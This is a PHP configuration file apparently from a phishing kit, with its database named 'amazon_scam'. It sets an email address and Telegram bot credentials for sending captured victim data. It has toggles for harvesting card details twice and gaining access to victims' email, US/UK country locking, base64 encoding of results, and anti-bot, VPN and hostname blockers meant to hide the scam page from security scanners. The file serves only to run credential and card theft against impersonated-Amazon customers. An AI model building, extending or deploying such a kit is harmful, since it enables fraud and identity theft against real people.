<?php
session_start();
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'amazon_scam';

$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
if ($conn->connect_error) die("Connection failed: " . $conn->connect_error);

$conn->set_charset("utf8mb4");

// Konfigurasi Default
$config = [
    'email_result' => 'result@kangenbojo.id',
    'telegram_token' => 'YOUR_TELEGRAM_BOT_TOKEN',
    'telegram_chat_id' => 'YOUR_CHAT_ID',
    'license_key' => '',
    'country_lock' => false,
    'allowed_countries' => ['US','UK'],
    'double_cc' => false,
    'get_email_access' => false,
    'encryption_method' => 'base64',
    'blocker_settings' => [
        'stopbot' => false,
        'undetect' => false,
        'botblocker' => false,
        'user_agent' => false,
        'hostname' => false,
        'ip_range' => false,
        'isp' => false,
        'proxy_port' => false,
        'dns' => false,
        'vpn' => false,
        'one_time' => false
    ],
    'sending_methods' => [
        'email' => true,
        'telegram' => true
    ]
    ,
    // Optional public site settings
    'public_site_url' => '',
    'signin_path' => 'login.php',
    'admin_path' => 'admin/'
];

// Load konfigurasi dari database
$result = $conn->query("SELECT * FROM settings LIMIT 1");
if ($result->num_rows > 0) {
    $db_config = $result->fetch_assoc();
    $config = array_merge($config, json_decode($db_config['config_data'], true));
}

// Load languages - note: functions.php will be loaded by the calling file
require_once __DIR__ . '/languages.php';
?>
